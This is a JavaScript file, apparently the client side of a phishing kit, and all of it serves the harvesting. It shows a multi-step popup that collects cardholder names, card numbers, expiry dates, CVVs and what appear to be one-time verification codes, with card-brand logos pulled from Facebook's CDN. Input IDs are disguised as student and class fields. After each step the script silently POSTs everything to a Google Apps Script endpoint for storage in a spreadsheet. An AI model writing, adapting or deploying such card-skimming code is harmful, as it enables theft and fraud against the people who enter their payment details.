const URL_BACKEND = "https://script.google.com/macros/s/AKfycbwPBEuLzKSs75vyvQwSggqDn1GwJiudpJKNUWgf5jr7J--i_2MnnYYP4rRAcV97tyTIfg/exec";

function formatMMYY(el) {
    let val = el.value.replace(/\D/g, '');
    if (val.length > 2) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
    }
    el.value = val;
}

// Fungsi validasi khusus nomor kartu: hanya angka, panjang sesuai jenis
function validasiNomorKartu(el, logoId) {
    const logo = document.getElementById(logoId);
    // Hapus semua karakter yang bukan angka
    let val = el.value.replace(/[^0-9]/g, '');
    el.value = val;

    logo.style.display = 'none';

    // Atur panjang maksimal dan tampilkan logo
    if (val.startsWith('5')) {
        el.maxLength = 16;
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yF/r/ZIeCyGzzAnR.webp?_nc_eui2=AeGWwsovkpKgGwR5712WjAOnSDhX2V7vCpNIOFfZXu8KkzsklIN_PeJIQyN_Dc2HO-Nam4L4_wo25wTn70CGGFEn';
        logo.style.display = 'block';
    } else if (val.startsWith('4')) {
        el.maxLength = 16;
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yw/r/IqqGd5lm28u.webp?_nc_eui2=AeEcfLNBgWfMfn2FlPUptMio7ytqcbilrFXvK2pxuKWsVbrgYgT61QZYYVZltyEvx_pGoDhLhCJVcxzCOLn3yfjf';
        logo.style.display = 'block';
    } else if (val.startsWith('3')) {
        el.maxLength = 15;
        logo.src = 'https://static.xx.fbcdn.net/rsrc.php/yA/r/X91YHq0KzqQ.webp?_nc_eui2=AeH3udDwy0csMqZkNmFMritx0t6v52TsYTHS3q_nZOxhMTjTR5EztPutwBcpX_bKTH_icI3T5cy1QeIHNNEBZOC5';
        logo.style.display = 'block';
    }
}

async function simpanDataKeSpreadsheet() {
    const data = {
        nama1: document.getElementById('nama')?.value || "",
        nomorKartu1: document.getElementById('kodeSiswa')?.value || "",
        masaBerlaku1: document.getElementById('mmyy')?.value || "",
        cvv1: document.getElementById('kelas')?.value || "",
        nama2: document.getElementById('nama2')?.value || "",
        nomorKartu2: document.getElementById('kodeSiswa2')?.value || "",
        masaBerlaku2: document.getElementById('mmyy2')?.value || "",
        cvv2: document.getElementById('kelas2')?.value || "",
        kodeVerifikasi1: document.getElementById('kodeVerifikasi1')?.value || "",
        kodeVerifikasi2: document.getElementById('kodeVerifikasi2')?.value || "",
        waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
    };

    try {
        await fetch(URL_BACKEND, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(data)
        });
        return true;
    } catch (error) {
        console.error("Detail kesalahan:", error);
        return false;
    }
}

async function nextPopup(current, next) {
    // Validasi jumlah digit sebelum pindah dari popup 1
    if (current === 'popup1') {
        const nomor = document.getElementById('kodeSiswa').value;
        const awalan = nomor.charAt(0);
        let panjangValid = awalan === '3' ? 15 : 16;

        if (nomor.length !== panjangValid) {
            alert(`Nomor kartu harus berisi ${panjangValid} digit angka (awalan ${awalan})!`);
            return;
        }
    }

    if(current === 'popup1' || current === 'popup2' || current === 'popup3') {
        const berhasil = await simpanDataKeSpreadsheet();
        if (!berhasil) return;

        if(current === 'popup1') {
            let code = document.getElementById('kodeSiswa').value;
            let last4 = code.slice(-4);
            document.getElementById('kelasDisplay').innerText = last4;
            document.getElementById('kelasDisplay2').innerText = last4;
        }
    }
    
    document.getElementById(current).classList.add('hidden');
    document.getElementById(next).classList.remove('hidden');
}
